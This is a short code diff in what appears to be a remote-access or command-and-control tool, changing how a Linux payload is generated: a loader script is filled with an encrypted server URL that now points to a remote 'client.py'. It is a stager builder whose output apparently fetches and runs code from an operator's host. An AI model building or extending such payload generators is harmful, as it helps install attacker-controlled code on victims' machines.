@@ -162,7 +162,8 @@ class server():
     def _payload(self,system):
         if system == "linux":
             payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
-            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(self.url.encode(),self.key),self.key)
+            url = self.url + "/client.py"
+            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
         elif system == "win":
             payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
         else:
